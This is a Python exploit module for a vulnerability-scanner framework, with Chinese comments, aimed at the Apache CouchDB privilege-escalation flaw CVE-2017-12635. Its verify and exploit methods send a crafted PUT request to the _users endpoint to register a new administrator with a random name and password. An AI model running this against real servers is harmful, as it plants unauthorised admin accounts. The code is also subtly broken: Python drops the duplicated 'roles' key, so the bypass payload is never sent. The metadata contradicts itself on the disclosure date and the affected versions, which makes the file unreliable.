# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import random
import json


class Vuln(ABVuln):
    vuln_id = 'Apache-CouchDB_0001'  # 平台漏洞编号，留空
    name = 'CouchDB 垂直权限绕过漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2017-11-04'  # 漏洞公布时间
    desc = '''
        在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，
        导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。
    '''  # 漏洞描述
    ref = 'https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2017-12635'  # cve编号
    product = 'Apache-CouchDB'  # 漏洞应用名称
    product_version = '< 1.7.0 && < 2.1.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '85967b83-b1b2-4292-819b-4400daa1ff20'
    author = '47bwy'  # POC编写者
    create_date = '2018-04-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 生成随机注册信息
            info = 'admin' + str(random.randint(1, 10000))
            headers = {
                'Content-Type': 'application/json'
            }
            data = {
                "type": "user",
                "name": info,
                "roles": ["_admin"],
                "roles": [],
                "password": info
            }
            data = json.dumps(data)
            url = self.target + \
                '/_users/org.couchdb.user:{admin}'.format(admin=info)
            r = requests.put(url, data=data, headers=headers)
            if info in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 生成随机注册信息
            info = 'admin' + str(random.randint(1, 10000))
            headers = {
                'Content-Type': 'application/json'
            }
            data_dict = {
                "type": "user",
                "name": info,
                "roles": ["_admin"],
                "roles": [],
                "password": info
            }
            data_json = json.dumps(data_dict)
            url = self.target + \
                '/_users/org.couchdb.user:{admin}'.format(admin=info)
            r = requests.put(url, data=data_json, headers=headers)
            if info in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，已注册用户:{uname}，密码：{passwd},请及时删除。'.format(
                    target=self.target, name=self.vuln.name, uname=info, passwd=info))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
